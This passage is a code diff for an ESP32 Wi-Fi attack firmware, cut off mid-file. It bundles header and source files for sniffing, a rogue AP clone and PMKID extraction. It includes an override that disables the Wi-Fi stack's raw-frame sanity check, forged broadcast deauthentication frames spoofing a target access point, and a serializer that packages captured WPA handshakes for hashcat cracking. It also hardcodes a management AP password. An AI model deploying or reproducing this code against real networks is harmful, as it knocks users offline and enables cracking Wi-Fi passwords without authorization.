+#define CONFIG_MGMT_AP_PASSWORD "Venome@kali"
+#define CONFIG_MGMT_AP_MAX_CONNECTIONS 1
+
+/* ==================== frame_analyzer_types.h content ==================== */
+#ifndef FRAME_ANALYZER_TYPES_H
+#define FRAME_ANALYZER_TYPES_H
+
+#include <stdint.h>
+
+/**
+ * @see Ref: 802.1X-2020 [11.1.4]
+ */
+#define ETHER_TYPE_EAPOL 0x888e
+
+/**
+ * @see Ref: 802.1X-2020 [11.3.2]
+ */
+typedef enum
+{
+  EAPOL_EAP_PACKET = 0,
+  EAPOL_START,
+  EAPOL_LOGOFF,
+  EAPOL_KEY,
+  EAPOL_ENCAPSULATED_ASF_ALERT,
+  EAPOL_MKA,
+  EAPOL_ANNOUNCEMENT_GENERIC,
+  EAPOL_ANNOUNCEMENT_SPECIFIC,
+  EAPOL_ANNOUNCEMENT_REQ
+} eapol_packet_types_t;
+
+typedef struct
+{
+  uint8_t protocol_version : 2;
+  uint8_t type : 2;
+  uint8_t subtype : 4;
+  uint8_t to_ds : 1;
+  uint8_t from_ds : 1;
+  uint8_t more_fragments : 1;
+  uint8_t retry : 1;
+  uint8_t power_management : 1;
+  uint8_t more_data : 1;
+  uint8_t protected_frame : 1;
+  uint8_t htc_order : 1;
+} frame_control_t;
+
+typedef struct
+{
+  frame_control_t frame_control;
+  uint16_t duration;
+  uint8_t addr1[6];
+  uint8_t addr2[6];
+  uint8_t addr3[6];
+  uint16_t sequence_control;
+} data_frame_mac_header_t;
+
+typedef struct
+{
+  data_frame_mac_header_t mac_header;
+  uint8_t body[];
+} data_frame_t;
+
+typedef struct
+{
+  uint8_t snap_dsap;
+  uint8_t snap_ssap;
+  uint8_t control;
+  uint8_t encapsulation[3];
+} llc_snap_header_t;
+
+/**
+ * Size: 4 bytes
+ * @see Ref: 802.1X-2020 [11.3]
+ */
+typedef struct
+{
+  uint8_t version;
+  uint8_t packet_type;
+  uint16_t packet_body_length;
+} eapol_packet_header_t;
+
+/**
+ * @see Ref: 802.1X-2020 [11.3], 802.11-2016 [12.7.2]
+ */
+typedef struct
+{
+  eapol_packet_header_t header;
+  uint8_t packet_body[];
+} eapol_packet_t;
+
+/**
+ * Size: 2 bytes
+ * @note unnamed fields are "reserved"
+ * @see Ref: 802.11-2016 [12.7.2]
+ */
+typedef struct
+{
+  uint8_t key_descriptor_version : 3;
+  uint8_t key_type : 1;
+  uint8_t : 2;
+  uint8_t install : 1;
+  uint8_t key_ack : 1;
+  uint8_t key_mic : 1;
+  uint8_t secure : 1;
+  uint8_t error : 1;
+  uint8_t request : 1;
+  uint8_t encrypted_key_data : 1;
+  uint8_t smk_message : 1;
+  uint8_t : 2;
+} key_information_t;
+
+/**
+ * @todo MIC lenght is dependent on 802.11-2016 [12.7.3] - key_infromation_t.descrptor_version
+ * @see Ref: 802.11-2016 [12.7.2]
+ */
+typedef struct __attribute__((__packed__))
+{
+  uint8_t descriptor_type;
+  key_information_t key_information;
+  uint16_t key_length;
+  uint8_t key_replay_counter[8];
+  uint8_t key_nonce[32];
+  uint8_t key_iv[16];
+  uint8_t key_rsc[8];
+  uint8_t reserved[8];
+  uint8_t key_mic[16];
+  uint16_t key_data_length;
+  uint8_t key_data[];
+} eapol_key_packet_t;
+
+/**
+ * @see Ref: 802.11-2016 [12.7.2, Table 12-6]
+ */
+#define KEY_DATA_TYPE 0xdd
+
+/**
+ * @note Needs trailing byte due to casting to uint32_t and converting from netlong
+ * @see Ref: 802.11-2016 [12.7.2, Table 12-6]
+ */
+#define KEY_DATA_OUI_IEEE80211 0x00fac00
+
+/**
+ * @see Ref: 802.11-2016 [12.7.2, Table 12-6]
+ */
+#define KEY_DATA_DATA_TYPE_PMKID_KDE 4
+
+/**
+ * @see Ref: 802.11-2016 [12.7.2]
+ */
+typedef struct __attribute__((__packed__))
+{
+  uint8_t type;
+  uint8_t length;
+  uint32_t oui : 24;
+  uint32_t data_type : 8;
+  uint8_t data[];
+} key_data_field_t;
+
+/**
+ * @brief linked list of PMKIDs
+ */
+typedef struct pmkid_item
+{
+  uint8_t pmkid[16];
+  struct pmkid_item *next;
+} pmkid_item_t;
+
+#endif
+
+/* ==================== frame_analyzer_parser.h content ==================== */
+#ifndef FRAME_ANALYZER_PARSER_H
+#define FRAME_ANALYZER_PARSER_H
+
+#include <stdint.h>
+#include <stdbool.h>
+
+/**
+ * @brief Determines whether BSSID inside of the given frame matches given BSSID.
+ *
+ * @param frame
+ * @param bssid
+ * @return bool
+ */
+bool is_frame_bssid_matching(wifi_promiscuous_pkt_t *frame, uint8_t *bssid);
+
+/**
+ * @brief Parses EAPoL packet from given frame.
+ *
+ * @param frame
+ * @return eapol_packet_t* if parsing successful
+ * @return \c NULL if no EAPoL packet was found
+ * @return \c NULL if frame is protected
+ */
+eapol_packet_t *parse_eapol_packet(data_frame_t *frame);
+
+/**
+ * @brief Parses EAPoL-Key packet from EAPoL packet
+ *
+ * @note result does not include EAPoL header
+ * @param eapol_packet
+ * @return eapol_key_packet_t* if parsing successful
+ * @return \c NULL if no EAPoL-Key packet found
+ */
+eapol_key_packet_t *parse_eapol_key_packet(eapol_packet_t *eapol_packet);
+
+/**
+ * @brief Parses PMKIDs from EAPoL-Key packet
+ *
+ * @param eapol_key
+ * @return pmkid_item_t* linked list of PMKIDs if parsing successful
+ * @return \c NULL if no key data present
+ * @return \c NULL if key data are encrypted
+ * @return \c NULL parsing fails
+ */
+pmkid_item_t *parse_pmkid(eapol_key_packet_t *eapol_key);
+
+#endif
+
+/* ==================== frame_analyzer.h content ==================== */
+#ifndef FRAME_ANALYZER_H
+#define FRAME_ANALYZER_H
+
+#include "esp_event.h"
+
+ESP_EVENT_DECLARE_BASE(FRAME_ANALYZER_EVENTS);
+
+enum
+{
+  DATA_FRAME_EVENT_EAPOLKEY_FRAME,
+  DATA_FRAME_EVENT_PMKID
+};
+
+/**
+ * @brief Search types for frame analyzer.
+ *
+ * This hints frame analyzer what kind of information is requested.
+ */
+typedef enum
+{
+  SEARCH_HANDSHAKE,
+  SEARCH_PMKID
+} search_type_t;
+
+/**
+ * @brief Starts frame analysis based on given search type and BSSID.
+ *
+ * @param search_type type of information that are demanded
+ * @param bssid target AP's BSSID
+ */
+void frame_analyzer_capture_start(search_type_t search_type, const uint8_t *bssid);
+
+/**
+ * @brief stops frame analysis
+ *
+ */
+void frame_analyzer_capture_stop();
+
+#endif
+
+/* ==================== sniffer.h content ==================== */
+#ifndef SNIFFER_H
+#define SNIFFER_H
+
+#include <stdbool.h>
+
+ESP_EVENT_DECLARE_BASE(SNIFFER_EVENTS);
+
+enum
+{
+  SNIFFER_EVENT_CAPTURED_DATA,
+  SNIFFER_EVENT_CAPTURED_MGMT,
+  SNIFFER_EVENT_CAPTURED_CTRL
+};
+
+/**
+ * @brief Sets sniffer filter for specific frame types.
+ *
+ * @param data sniff data frames
+ * @param mgmt sniff management frames
+ * @param ctrl sniff control frames
+ */
+void wifictl_sniffer_filter_frame_types(bool data, bool mgmt, bool ctrl);
+
+/**
+ * @brief Start promiscuous mode on given channel
+ *
+ * @param channel channel on which sniffer should operate
+ */
+void wifictl_sniffer_start(uint8_t channel);
+
+/**
+ * @brief Stop promisuous mode
+ *
+ */
+void wifictl_sniffer_stop();
+
+#endif
+
+/* ==================== ap_scanner.h content ==================== */
+#ifndef AP_SCANNER_H
+#define AP_SCANNER_H
+
+#include "esp_wifi_types.h"
+
+/**
+ * @brief Linked list of wifi_ap_record_t records.
+ *
+ */
+typedef struct
+{
+  uint16_t count;
+  wifi_ap_record_t records[CONFIG_SCAN_MAX_AP];
+} wifictl_ap_records_t;
+
+/**
+ * @brief Switches ESP into scanning mode and stores result.
+ *
+ */
+void wifictl_scan_nearby_aps();
+
+/**
+ * @brief Returns current list of scanned APs.
+ *
+ * @return const wifictl_ap_records_t*
+ */
+const wifictl_ap_records_t *wifictl_get_ap_records();
+
+/**
+ * @brief Returns AP record on given index
+ *
+ * @param index
+ * @return const wifi_ap_record_t*
+ */
+const wifi_ap_record_t *wifictl_get_ap_record(unsigned index);
+
+#endif
+
+/* ==================== pcap_serializer.h content ==================== */
+#ifndef PCAP_SERIALIZER_H
+#define PCAP_SERIALIZER_H
+
+#include <stdint.h>
+
+/**
+ * @brief PCAP global header
+ *
+ * @see Ref: https://gitlab.com/wireshark/wireshark/-/wikis/Development/LibpcapFileFormat#global-header
+ */
+typedef struct
+{
+  uint32_t magic_number;  /* magic number */
+  uint16_t version_major; /* major version number */
+  uint16_t version_minor; /* minor version number */
+  int32_t thiszone;       /* GMT to local correction */
+  uint32_t sigfigs;       /* accuracy of timestamps */
+  uint32_t snaplen;       /* max length of captured packets, in octets */
+  uint32_t network;       /* data link type */
+} pcap_global_header_t;
+
+/**
+ * @brief PCAP record header
+ *
+ * @see Ref: https://gitlab.com/wireshark/wireshark/-/wikis/Development/LibpcapFileFormat
+ */
+typedef struct
+{
+  uint32_t ts_sec;   /* timestamp seconds */
+  uint32_t ts_usec;  /* timestamp microseconds */
+  uint32_t incl_len; /* number of octets of packet saved in file */
+  uint32_t orig_len; /* actual length of packet */
+} pcap_record_header_t;
+
+/**
+ * @brief Prepares new empty buffer for PCAP formatted binary data.
+ *
+ * Has always to be called before pcap_serializer_append_frame()
+ * @return uint8_t* pointer to newly allocated PCAP buffer.
+ * @return \c NULL initialisation failed
+ */
+uint8_t *pcap_serializer_init();
+
+/**
+ * @brief Appends new frame to existing PCAP buffer.
+ *
+ * Expects pcap_serializer_append_frame() was already called.
+ * @param buffer frame buffer that should be appended to PCAP
+ * @param size size of frame buffer
+ * @param ts_usec timestamp of captured frame in microseconds
+ */
+void pcap_serializer_append_frame(const uint8_t *buffer, unsigned size, unsigned ts_usec);
+
+/**
+ * @brief Frees PCAP buffer and resets all values.
+ *
+ * After calling this function, you have to call pcap_serializer_init() to append new frames again.
+ *
+ */
+void pcap_serializer_deinit();
+
+/**
+ * @brief Returns size of PCAP buffer in bytes
+ *
+ * @return unsigned
+ */
+unsigned pcap_serializer_get_size();
+
+/**
+ * @brief Return pointer to PCAP buffer
+ *
+ * @return uint8_t*
+ */
+uint8_t *pcap_serializer_get_buffer();
+
+#endif
+
+/* ==================== hccapx_serializer.h content ==================== */
+#ifndef HCCAPX_SERIALIZER_H
+#define HCCAPX_SERIALIZER_H
+
+#include <stdint.h>
+
+/**
+ * @brief HCCAPX structure according to reference
+ *
+ * @see Ref: https://hashcat.net/wiki/doku.php?id=hccapx
+ */
+typedef struct __attribute__((__packed__))
+{
+  uint32_t signature;
+  uint32_t version;
+  uint8_t message_pair;
+  uint8_t essid_len;
+  uint8_t essid[32];
+  uint8_t keyver;
+  uint8_t keymic[16];
+  uint8_t mac_ap[6];
+  uint8_t nonce_ap[32];
+  uint8_t mac_sta[6];
+  uint8_t nonce_sta[32];
+  uint16_t eapol_len;
+  uint8_t eapol[256];
+} hccapx_t;
+
+/**
+ * @brief Creates new HCCAPX buffer for given SSID.
+ *
+ * This will clear any previous HCCAPX. If you want to save it, first call hccapx_serializer_get() and copy buffer somewhere else.
+ * @param ssid SSID of AP from which the handshake frames will be comming.
+ * @param size length of SSID string (including \0)
+ */
+void hccapx_serializer_init(const uint8_t *ssid, unsigned size);
+
+/**
+ * @brief Returns pointer to buffer with HCCAPX formatted binary data
+ *
+ * @return hccapx_t*
+ */
+hccapx_t *hccapx_serializer_get();
+
+/**
+ * @brief Adds new handshake frames into current HCCAPX.
+ *
+ * This function will process given frames and extract data that are relevant.
+ * If frame contains handshake from another STA than the one that was already added before,
+ * frame will be skipped and error message will be printed.
+ *
+ * @param frame data frame with EAPoL-Key packet
+ */
+void hccapx_serializer_add_frame(data_frame_t *frame);
+
+#endif
+
+/* ==================== wsl_bypasser.h content ==================== */
+#ifndef WSL_BYPASSER_H
+#define WSL_BYPASSER_H
+
+#include "esp_wifi_types.h"
+
+/**
+ * @brief Sends frame in frame_buffer using esp_wifi_80211_tx but bypasses blocking mechanism
+ *
+ * @param frame_buffer
+ * @param size size of frame buffer
+ */
+void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);
+
+/**
+ * @brief Sends deauthentication frame with forged source AP from given ap_record
+ *
+ * This will send deauthentication frame acting as frame from given AP, and destination will be broadcast
+ * MAC address - \c ff:ff:ff:ff:ff:ff
+ *
+ * @param ap_record AP record with valid AP information
+ */
+void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record);
+
+#endif
+
+/* ==================== attack.h content ==================== */
+#ifndef ATTACK_H
+#define ATTACK_H
+
+/**
+ * @brief Implemented attack types that can be chosen.
+ *
+ */
+typedef enum
+{
+  ATTACK_TYPE_PASSIVE,
+  ATTACK_TYPE_HANDSHAKE,
+  ATTACK_TYPE_PMKID,
+  ATTACK_TYPE_DOS
+} attack_type_t;
+
+/**
+ * @brief States of single attack run.
+ *
+ * @note TIMEOUT will be removed in #64
+ */
+typedef enum
+{
+  READY,    ///< no attack is in progress and results from previous attack run are available.
+  RUNNING,  ///< attack is in progress, attack_status_t.content may not be consistent.
+  FINISHED, ///< last attack finsihed and results are available.
+  TIMEOUT   ///< last attack timed out. This option will be moved as sub category of FINISHED state.
+} attack_state_t;
+
+/**
+ * @brief Attack config parsed from webserver request
+ *
+ * @deprecated will be removed in #45
+ */
+typedef struct
+{
+  uint8_t type;
+  uint8_t method;
+  uint8_t timeout;
+  const wifi_ap_record_t *ap_record;
+} attack_config_t;
+
+/**
+ * @brief Contains current attack status.
+ *
+ * This structure contains all information and data about latest attack.
+ */
+typedef struct
+{
+  uint8_t state; ///< attack_state_t
+  uint8_t type;  ///< attack_type_t
+  uint16_t content_size;
+  char *content;
+} attack_status_t;
+
+/**
+ * @brief Returns pointer to attack_status_t structure.
+ *
+ * @return const attack_status_t*  pointer to the status strucutre
+ */
+const attack_status_t *attack_get_status();
+
+/**
+ * @brief Function to update current status of attack.
+ *
+ * If FINISHED state is passed, then the attack timeout timer is stopped.
+ * @param state new attack state of type attack_state_t to be set
+ */
+void attack_update_status(attack_state_t state);
+
+/**
+ * @brief Initialises attack wrapper. This function should be callend only once.
+ *
+ * This function creates all necessary resources for attack wrapper. It has to be called before any attack can be run.
+ */
+void attack_init();
+
+/**
+ * @brief Allocates status content of given size.
+ *
+ * @param size size to be allocated
+ * @return char* pointer to newly allocated status content
+ */
+char *attack_alloc_result_content(unsigned size);
+
+/**
+ * @brief Reallocates current status content and appends new data.
+ *
+ * @param buffer new data to be appended to status content
+ * @param size size of the new data to be appended
+ */
+void attack_append_status_content(uint8_t *buffer, unsigned size);
+
+#endif
+
+/* ==================== attack_method.h content ==================== */
+#ifndef ATTACK_METHOD_H
+#define ATTACK_METHOD_H
+
+/**
+ * @brief Starts duplicated AP with same BSSID as genuine AP from ap_record
+ *
+ * This will execute deauthentication attack for given AP.
+ * @param ap_record target AP that will be cloned/duplicated
+ */
+void attack_method_rogueap(const wifi_ap_record_t *ap_record);
+
+#endif
+
+/* ==================== attack_handshake.h content ==================== */
+#ifndef ATTACK_HANDSHAKE_H
+#define ATTACK_HANDSHAKE_H
+
+/**
+ * @brief Available methods that can be chosen for the attack.
+ *
+ */
+typedef enum
+{
+  ATTACK_HANDSHAKE_METHOD_ROGUE_AP,  ///< Method using rogue/duplicated AP utilising native ESP-IDF behaviour only
+  ATTACK_HANDSHAKE_METHOD_BROADCAST, ///< Method that takes advantage of WSL Bypasser component that bypass blocking mechanism in Wi-Fi Stack Libraries
+                                     /// to send raw 802.11 frames
+  ATTACK_HANDSHAKE_METHOD_PASSIVE,   ///< Passive method that does not intervene communication on network, just passively capture handshake frames
+} attack_handshake_methods_t;
+
+/**
+ * @brief Starts handshake attack with given attack config.
+ *
+ * To stop handshake attack, call attack_handshake_stop().
+ *
+ * @param attack_config attack config with valid ap_record and attack method chosen
+ */
+void attack_handshake_start(attack_config_t *attack_config);
+
+/**
+ * @brief Stops handshake attack.
+ *
+ * This function stops everything that attack_handshake_start() started and resets all values to default state.
+ */
+void attack_handshake_stop();
+
+#endif
+
+/* ==================== webserver.h content ==================== */
+#ifndef WEBSERVER_H
+#define WEBSERVER_H
+
+#include "esp_event.h"
+
+ESP_EVENT_DECLARE_BASE(WEBSERVER_EVENTS);
+
+// 🔴 IS NORMAL ENUM KO HATAO AUR YE USE KARO:
+typedef enum
+{
+  WEBSERVER_EVENT_ATTACK_REQUEST,
+  WEBSERVER_EVENT_ATTACK_RESET
+} webserver_event_id_t; // Name change kiya
+
+/**
+ * @brief Struct to deserialize attack request parameters
+ *
+ */
+typedef struct
+{
+  uint8_t ap_record_id; //< ID of chosen AP
+  uint8_t type;         //< Chosen type of attack
+  uint8_t method;       //< Chosen method of attack
+  uint8_t timeout;      //< Attack timeout in seconds
+} attack_request_t;
+
+/**
+ * @brief Initializes and starts webserver
+ */
+void webserver_run();
+
+#endif
+
+/* ==================== wifi_controller.h content ==================== */
+#ifndef WIFI_CONTROLLER_H
+#define WIFI_CONTROLLER_H
+
+#include <stdint.h>
+#include <unistd.h>
+
+#include "esp_wifi_types.h"
+
+/**
+ * @brief Starts AP with given config
+ *
+ * @param wifi_config
+ */
+void wifictl_ap_start(wifi_config_t *wifi_config);
+
+/**
+ * @brief Stops running AP
+ *
+ */
+void wifictl_ap_stop();
+
+/**
+ * @brief Starts default management AP
+ *
+ */
+void wifictl_mgmt_ap_start();
+
+/**
+ * @brief Connects station interface to the given AP
+ *
+ * @param ap_record
+ * @param password password for target network
+ */
+void wifictl_sta_connect_to_ap(const wifi_ap_record_t *ap_record, const char password[]);
+
+/**
+ * @brief Disconnects station interface from currently connected AP
+ *
+ */
+void wifictl_sta_disconnect();
+
+/**
+ * @brief Sets AP interface MAC address
+ *
+ * @param mac_ap valid MAC address is expected, array of size 6
+ */
+void wifictl_set_ap_mac(const uint8_t *mac_ap);
+
+/**
+ * @brief Saves current AP interface MAC to given parameter
+ *
+ * @attention this function expects that the mac_ap points to already allocated memory (6 bytes)
+ * @param mac_ap 6 bytes memory block
+ */
+void wifictl_get_ap_mac(uint8_t *mac_ap);
+
+/**
+ * @brief Restores original AP interface MAC that was set during Wi-Fi initialisation.
+ */
+void wifictl_restore_ap_mac();
+
+/**
+ * @brief Sets STA interface MAC address
+ *
+ * @param mac_ap valid MAC address is expected, array of size 6
+ */
+void wifictl_get_sta_mac(uint8_t *mac_sta);
+
+/**
+ * @brief Sets new channel for Wi-Fi interface
+ *
+ * @param channel channel in range 1 - 13
+ */
+void wifictl_set_channel(uint8_t channel);
+#endif
+
+/* ==================== EVENT BASES ==================== */
+ESP_EVENT_DEFINE_BASE(FRAME_ANALYZER_EVENTS);
+ESP_EVENT_DEFINE_BASE(SNIFFER_EVENTS);
+ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);
+
+// ==================== Static variables ====================
+static const char *TAG = "main";
+
+/* ==================== wsl_bypasser.c content ==================== */
+static const char *TAG_WSL = "wsl_bypasser";
+/**
+ * @brief Deauthentication frame template
+ *
+ * Destination address is set to broadcast.
+ * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
+ *
+ * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
+ */
+static const uint8_t deauth_frame_default[] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00};
+
+/**
+ * @brief Decomplied function that overrides original one at compilation time.
+ *
+ * @attention This function is not meant to be called!
+ * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
+ */
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
+{
+  return 0;
+}
+
+void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size)
+{
+  ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+}
+
+void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record)
+{
+  ESP_LOGD(TAG_WSL, "Sending deauth frame...");
+  uint8_t deauth_frame[sizeof(deauth_frame_default)];
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+  memcpy(&deauth_frame[10], ap_record->bssid, 6);
+  memcpy(&deauth_frame[16], ap_record->bssid, 6);
+
+  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+}
+
+/* ==================== pcap_serializer.c content ==================== */
+static const char *TAG_PCAP = "pcap_serializer";
+
+/**
+ * @brief Constanst according to reference
+ *
+ * @see Ref: https://gitlab.com/wireshark/wireshark/-/wikis/Development/LibpcapFileFormat#global-header
+ */
+//@{
+#define SNAPLEN 65535
+#define PCAP_MAGIC_NUMBER 0xa1b2c3d4
+//@}
+
+/**
+ * @brief Constanst according to reference
+ *
+ * @see Ref: http://www.tcpdump.org/linktypes.html (LINKTYPE_IEEE802_11)
+ */
+#define LINKTYPE_IEEE802_11 105
+
+static unsigned pcap_size = 0;
+static uint8_t *pcap_buffer = NULL;
+
+uint8_t *pcap_serializer_init()
+{
+  // Make sure memory from previous attack is freed
+  free(pcap_buffer);
+  // Ref: https://gitlab.com/wireshark/wireshark/-/wikis/Development/LibpcapFileFormat#global-header
+  pcap_global_header_t pcap_global_header = {
+      .magic_number = PCAP_MAGIC_NUMBER,
+      .version_major = 2,
+      .version_minor = 4,
+      .thiszone = 0,
+      .sigfigs = 0,
+      .snaplen = SNAPLEN,
+      .network = LINKTYPE_IEEE802_11};
+  pcap_buffer = (uint8_t *)malloc(sizeof(pcap_global_header_t));
+  pcap_size = sizeof(pcap_global_header_t);
+  memcpy(pcap_buffer, &pcap_global_header, sizeof(pcap_global_header_t));
+  return pcap_buffer;
+}
+
+void pcap_serializer_append_frame(const uint8_t *buffer, unsigned size, unsigned ts_usec)
+{
+  if (size == 0)
+  {
+    ESP_LOGD(TAG_PCAP, "Frame size is 0. Not appending anything.");
+    return;
+  }
+  // Ref: https://gitlab.com/wireshark/wireshark/-/wikis/Development/LibpcapFileFormat#record-packet-header
+  pcap_record_header_t pcap_record_header = {
+      .ts_sec = ts_usec / 1000000,
+      .ts_usec = ts_usec % 1000000,
+      .incl_len = size,
+      .orig_len = size,
+  };
+  // Ref: https://gitlab.com/wireshark/wireshark/-/wikis/Development/LibpcapFileFormat#record-packet-header
+  // Stored packet/frame cannot be larger than SNAPLEN
+  if (size > SNAPLEN)
+  {
+    size = SNAPLEN;
+    pcap_record_header.incl_len = SNAPLEN;
+  }
+
+  uint8_t *reallocated_pcap_buffer = (uint8_t *)realloc(pcap_buffer, pcap_size + sizeof(pcap_record_header_t) + size);
+  if (reallocated_pcap_buffer == NULL)
+  {
+    ESP_LOGE(TAG_PCAP, "Error reallocating PCAP buffer! PCAP buffer may not be complete.");
+    return;
+  }
+  memcpy(&reallocated_pcap_buffer[pcap_size], &pcap_record_header, sizeof(pcap_record_header_t));
+  memcpy(&reallocated_pcap_buffer[pcap_size + sizeof(pcap_record_header_t)], buffer, size);
+  pcap_buffer = reallocated_pcap_buffer;
+  pcap_size += sizeof(pcap_record_header_t) + size;
+}
+
+void pcap_serializer_deinit()
+{
+  free(pcap_buffer);
+  pcap_buffer = NULL;
+  pcap_size = 0;
+}
+
+unsigned pcap_serializer_get_size()
+{
+  return pcap_size;
+}
+
+uint8_t *pcap_serializer_get_buffer()
+{
+  return pcap_buffer;
+}
+
+/* ==================== hccapx_serializer.c content ==================== */
+/**
+ * @brief Constants based on reference
+ *
+ * @see Ref: https://hashcat.net/wiki/doku.php?id=hccapx
+ */
+//@{
+#define HCCAPX_SIGNATURE 0x58504348
+#define HCCAPX_VERSION 4
+#define HCCAPX_KEYVER_WPA 1
+#define HCCAPX_KEYVER_WPA2 2
+#define HCCAPX_MAX_EAPOL_SIZE 256
+//@}
+
+static const char *TAG_HCCAPX = "hccapx_serializer";
+
+/**
+ * @brief Default values for hccapx buffer
+ */
+static hccapx_t hccapx = {
+    .signature = HCCAPX_SIGNATURE,
+    .version = 4,
+    .message_pair = 255,
+    .keyver = HCCAPX_KEYVER_WPA2};
+
+/**
+ * @brief Stores last processed message
+ */
+//@{
+static unsigned message_ap = 0;
+static unsigned message_sta = 0;
+//@}
+
+/**
+ * @brief Stores number of message from which was the EAPoL packet saved.
+ */
+static unsigned eapol_source = 0;
+
+/**
+ * @brief Says whether array contains only zero values or not
+ *
+ * @param array array pointer
+ * @param size size of given array
+ * @return true all values are zero
+ * @return false some value is different from zero
+ */
+static bool is_array_zero(uint8_t *array, unsigned size)
+{
+  for (unsigned i = 0; i < size; i++)
+  {
+    if (array[i] != 0)
+    {
+      return false;
+    }
+  }
+  return true;
+}
+
+void hccapx_serializer_init(const uint8_t *ssid, unsigned size)
+{
+  memset(&hccapx, 0, sizeof(hccapx_t));
+  hccapx.signature = HCCAPX_SIGNATURE;
+  hccapx.version = HCCAPX_VERSION;
+  hccapx.message_pair = 255;
+  hccapx.keyver = HCCAPX_KEYVER_WPA2;
+  hccapx.essid_len = size;
+  memcpy(hccapx.essid, ssid, size);
+  hccapx.message_pair = 255;
+
+  message_ap = 0;
+  message_sta = 0;
+  eapol_source = 0;
+}
+
+hccapx_t *hccapx_serializer_get()
+{
+  if (hccapx.message_pair == 255)
+  {
+    return NULL;
+  }
+
+  return &hccapx;
+}
+
+/**
+ * @brief Saves EAPoL-Key frame into HCCAPX buffer
+ *
+ * Also sets Key MIC value to the one present in the given EAPoL-Key packet
+ *
+ * @param eapol_packet EAPoL packet to be saved that includes also EAPoL header
+ * @param eapol_key_packet EAPoL-Key parsed to get key MIC from it
+ * @return unsigned
+ * @return 1 if error occured
+ * @return 0 if successfully saved
+ */
+static unsigned save_eapol(eapol_packet_t *eapol_packet, eapol_key_packet_t *eapol_key_packet)
+{
+  unsigned eapol_len = 0;
+  eapol_len = sizeof(eapol_packet_header_t) + ntohs(eapol_packet->header.packet_body_length);
+  if (eapol_len > HCCAPX_MAX_EAPOL_SIZE)
+  {
+    ESP_LOGW(TAG_HCCAPX, "EAPoL is too long (%u/%u)", eapol_len, HCCAPX_MAX_EAPOL_SIZE);
+    return 1;
+  }
+  hccapx.eapol_len = eapol_len;
+  memcpy(hccapx.eapol, eapol_packet, hccapx.eapol_len);
+  memcpy(hccapx.keymic, eapol_key_packet->key_mic, 16);
+  // Clear key MIC from EAPoL packet so hashcat can calulate MIC without preprocessing.
+  // This is not documented in HCCAPX reference.
+  // But it's based on 802.11i-2004 [8.5.2/h] and by analysing behaviour of cap2hccapx tool
+  // MIC key on 77 bytes offset inside EAPoL-Key + 4 bytes EAPoL header.
+  memset(&hccapx.eapol[81], 0x0, 16);
+  return 0;
+}
+
+/**
+ * @brief Handles first message of WPA handshake - from AP to STA
+ *
+ * This message is from AP. It always contains ANonce.
+ *
+ * @param eapol_key_packet parsed EAPoL-Key packet
+ */
+static void ap_message_m1(eapol_key_packet_t *eapol_key_packet)
+{
+  ESP_LOGD(TAG_HCCAPX, "From AP M1");
+  message_ap = 1;
+  memcpy(hccapx.nonce_ap, eapol_key_packet->key_nonce, 32);
+}
+
+/**
+ * @brief Handles third message of WPA handshake - from AP to STA
+ *
+ * @param eapol_packet
+ * @param eapol_key_packet
+ */
+static void ap_message_m3(eapol_packet_t *eapol_packet, eapol_key_packet_t *eapol_key_packet)
+{
+  ESP_LOGD(TAG_HCCAPX, "From AP M3");
+  message_ap = 3;
+  if (message_ap == 0)
+  {
+    // No AP message was processed yet. ANonce has to be copied into HCCAPX buffer.
+    memcpy(hccapx.nonce_ap, eapol_key_packet->key_nonce, 32);
+  }
+  if (eapol_source == 2)
+  {
+    // EAPoL packet was already saved from message #2. No need to resave it.
+    hccapx.message_pair = 2;
+    return;
+  }
+  if (save_eapol(eapol_packet, eapol_key_packet) != 0)
+  {
+    return;
+  }
+  eapol_source = 3;
+  if (message_sta == 2)
+  {
+    hccapx.message_pair = 3;
+  }
+}
+
+/**
+ * @brief Handles messages from AP - handshake M1 and M3.
+ *
+ * @param frame
+ * @param eapol_packet
+ * @param eapol_key_packet
+ */
+static void ap_message(data_frame_t *frame, eapol_packet_t *eapol_packet, eapol_key_packet_t *eapol_key_packet)
+{
+  if ((!is_array_zero(hccapx.mac_sta, 6)) && (memcmp(frame->mac_header.addr1, hccapx.mac_sta, 6) != 0))
+  {
+    ESP_LOGE(TAG_HCCAPX, "Different STA");
+    return;
+  }
+  if (message_ap == 0)
+  {
+    memcpy(hccapx.mac_ap, frame->mac_header.addr2, 6);
+  }
+  // Determine which message this is by Key MIC
+  // Key MIC is always empty in M1 and always present in M3
+  // Ref: 802.11i-2004 [8.5.3]
+  if (is_array_zero(eapol_key_packet->key_mic, 16))
+  {
+    ap_message_m1(eapol_key_packet);
+  }
+  else
+  {
+    ap_message_m3(eapol_packet, eapol_key_packet);
+  }
+}
+
+/**
+ * @brief Handles second message of handshake - from STA to AP.
+ *
+ * Saves EAPoL packet as this is the first time key MIC is present.
+ * Saves SNonce.
+ *
+ * @param eapol_packet
+ * @param eapol_key_packet
+ */
+static void sta_message_m2(eapol_packet_t *eapol_packet, eapol_key_packet_t *eapol_key_packet)
+{
+  ESP_LOGD(TAG_HCCAPX, "From STA M2");
+  message_sta = 2;
+  memcpy(hccapx.nonce_sta, eapol_key_packet->key_nonce, 32);
+  if (save_eapol(eapol_packet, eapol_key_packet) != 0)
+  {
+    return;
+  }
+  eapol_source = 2;
+  if (message_ap == 1)
+  {
+    hccapx.message_pair = 0;
+    return;
+  }
+}
+
+/**
+ * @brief Handles fourth message of the handshake. From STA to AP.
+ *
+ *
+ * @param eapol_packet
+ * @param eapol_key_packet
+ */
